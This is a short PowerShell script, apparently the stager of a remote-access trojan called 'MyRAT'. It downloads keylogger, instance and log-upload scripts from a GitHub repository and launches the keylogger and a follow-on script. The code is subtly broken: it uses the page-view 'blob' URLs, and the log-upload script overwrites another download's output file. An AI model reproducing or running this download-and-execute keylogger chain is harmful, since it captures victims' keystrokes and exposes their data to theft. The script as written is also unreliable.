Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/keylogger.ps1 -OutFile keylogger.ps1
Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/getInst.ps1 -OutFile getInst.ps1
Invoke-WebRequest -Uri https://github.com/bruning-frighting/MyRAT/blob/main/keylogger/uploadLog.ps1 -OutFile getInst.ps1
Start-Process -FilePath "keylogger.ps1" -NoNewWindow -Wait
Start-Process -FilePath "getInst.ps1"
